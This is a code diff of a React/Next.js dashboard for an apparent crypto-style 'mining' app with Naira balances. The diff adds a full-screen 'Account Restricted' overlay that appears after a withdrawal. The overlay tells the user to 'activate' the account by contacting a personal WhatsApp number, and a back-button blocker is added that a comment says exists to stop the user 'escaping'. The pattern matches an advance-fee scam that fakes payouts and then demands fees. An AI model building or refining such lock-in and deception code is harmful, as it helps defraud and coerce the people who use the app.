@@ -7,8 +7,6 @@ import Link from 'next/link';
 import { loadUser, loadBalance, loadTx, saveBalance, saveTx } from '../utils/storage';
 import { formatNaira } from '../utils/format';
 
-
-
 export default function Dashboard(){
   const router = useRouter();
   const [user,setUser] = useState(null);
@@ -22,9 +20,9 @@ export default function Dashboard(){
   const [stats, setStats] = useState({ totalMined:0, totalWithdrawn:0, txCount:0 });
 
   /* ====== ADDED STATES & CONFIG (only additions) ====== */
-  const [restricted, setRestricted] = useState(false);
-  const [timeLeft, setTimeLeft] = useState(0);
-  const RESTRICT_AFTER = 10 * 60 * 1000; // 10 minutes
+  const [restricted, setRestricted] = useState(false); // UI lock state
+  const [timeLeft, setTimeLeft] = useState(0); // ms remaining until restriction
+  const RESTRICT_AFTER = 10 * 60 * 1000; // 10 minutes (not used to compute — canonical source is localStorage.gt_restriction_end)
   const WHATSAPP_LINK = 'https://wa.me/2348136361997';
   /* ==================================================== */
 
@@ -64,37 +62,55 @@ export default function Dashboard(){
     }
   },[]);
 
-  /* ====== ADDED: watch transactions and start 10-min countdown ====== */
+  /* ====== NEW: observe restriction timestamp + activation flag ====== */
   useEffect(() => {
-    if (!tx || tx.length === 0) return;
+    const check = () => {
+      try {
+        const activated = localStorage.getItem('gt_activated') === 'true';
+        if (activated) {
+          setRestricted(false);
+          setTimeLeft(0);
+          return;
+        }
 
-    // find the most recent withdraw attempt (pending/processing/successful)
-    const lastWithdraw = [...tx]
-      .reverse()
-      .find(t => t.type === 'withdraw' && (t.status === 'pending' || t.status === 'processing' || t.status === 'successful'));
+        const end = localStorage.getItem('gt_restriction_end');
+        if (!end) {
+          setRestricted(false);
+          setTimeLeft(0);
+          return;
+        }
 
-    if (!lastWithdraw || !lastWithdraw.created_at) {
-      return;
-    }
-
-    const startTime = new Date(lastWithdraw.created_at).getTime();
-
-    const update = () => {
-      const diff = Date.now() - startTime;
-      if (diff >= RESTRICT_AFTER) {
-        setRestricted(true);
-        setTimeLeft(0);
-      } else {
-        setRestricted(false);
-        setTimeLeft(RESTRICT_AFTER - diff);
+        const remaining = Number(end) - Date.now();
+        if (remaining <= 0) {
+          // restriction active (time elapsed) → show overlay / lock
+          setRestricted(true);
+          setTimeLeft(0);
+        } else {
+          // still in countdown window (show the "withdrawal window ends in" banner)
+          setRestricted(false);
+          setTimeLeft(remaining);
+        }
+      } catch (e) {
+        // ignore
       }
     };
 
-    update();
-    const iv = setInterval(update, 1000);
+    check();
+    const iv = setInterval(check, 1000);
     return () => clearInterval(iv);
-  }, [tx]);
+  }, []);
   /* ================================================================ */
+
+  // disable back button while restricted (prevent user from escaping)
+  useEffect(() => {
+    if (!restricted) return;
+    const blockBack = () => {
+      try { window.history.pushState(null, '', window.location.href); } catch (e) {}
+    };
+    blockBack();
+    window.addEventListener('popstate', blockBack);
+    return () => window.removeEventListener('popstate', blockBack);
+  }, [restricted]);
 
   function computeStats(transactions){
     const totalMined = (transactions.filter(t=>t.type==='mine' && (t.status==='claimed' || t.status==='successful'))
@@ -177,7 +193,7 @@ export default function Dashboard(){
     <Layout>
       <LogoHeader />
 
-      {/* ===== ADDED: Restriction popup (centered, blur background) ===== */}
+      {/* ===== FULL-SCREEN BLUR + LOCK OVERLAY WHEN restricted === true ===== */}
       {restricted && (
         <div
           role="dialog"
@@ -186,31 +202,40 @@ export default function Dashboard(){
             position: 'fixed',
             inset: 0,
             backgroundColor: 'rgba(0,0,0,0.45)',
-            backdropFilter: 'blur(6px)',
-            WebkitBackdropFilter: 'blur(6px)',
+            backdropFilter: 'blur(8px)',
+            WebkitBackdropFilter: 'blur(8px)',
             display: 'flex',
             justifyContent: 'center',
             alignItems: 'center',
-            zIndex: 9999
+            zIndex: 9999,
+            pointerEvents: 'auto'
           }}
         >
-          <div className="introBox card" style={{ maxWidth: 420, width: '92%', textAlign: 'center', padding: 20 }}>
-            <div style={{ fontWeight: 800, fontSize: 18, marginBottom: 12 }}>
+          <div className="introBox card" style={{ maxWidth: 480, width: '94%', textAlign: 'center', padding: 24 }}>
+            <div style={{ fontWeight: 800, fontSize: 20, marginBottom: 12 }}>
               Account Restricted ⚠️
             </div>
 
             <div className="small muted" style={{ lineHeight: 1.6, marginBottom: 16 }}>
-              Dear <strong>{user.fullName}</strong>, your withdrawal is processing.
-              Due to a temporary account restriction, you are required to activate
-              your account before the withdrawal can be successfully sent to your bank account.
+              Dear <strong>{user.fullName}</strong>, your recent withdrawal was processed.
+              To continue using the app please activate your account.
             </div>
+
+            {/* show timer if it's available before final lock (should be 0 once locked) */}
+            {timeLeft > 0 ? (
+              <div style={{ marginBottom: 12, fontWeight: 700, color: '#1e40af' }}>
+                ⏱️ Restriction will engage in: {formatTime(timeLeft)}
+              </div>
+            ) : (
+              <div style={{ marginBottom: 12, fontWeight: 700, color: '#dc2626' }}>
+                ⛔ Account locked — activation required
+              </div>
+            )}
 
             <button
               className="btn"
               style={{ width: '100%', fontWeight: 800 }}
-              onClick={() => {
-                window.location.href = WHATSAPP_LINK;
-              }}
+              onClick={() => { window.location.href = WHATSAPP_LINK; }}
             >
               👉 CLICK TO ACTIVATE
             </button>
